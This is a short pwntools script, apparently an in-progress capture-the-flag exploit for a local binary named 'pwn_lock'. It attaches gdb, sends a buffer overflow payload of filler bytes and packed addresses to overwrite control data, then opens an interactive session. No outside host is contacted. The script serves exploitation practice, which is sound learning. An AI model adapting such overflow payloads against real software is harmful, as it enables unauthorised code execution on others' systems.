from pwn import *
import string
context.binary = './pwn_lock'
context.log_level = 'debug'
context.timeout = None
elf = context.binary


def dbg():
	raw_input()

libc = context.binary.libc
p = process('./pwn_lock')
gdb.attach(p)
dbg()


payload = 'a'*0x88 + p64(0x600e0) + 'a'*0x10 + p64(0x601080)
#payload = 'a' * 0x100 + p64(0x601080)
p.sendline(payload)


p.interactive()
p.close()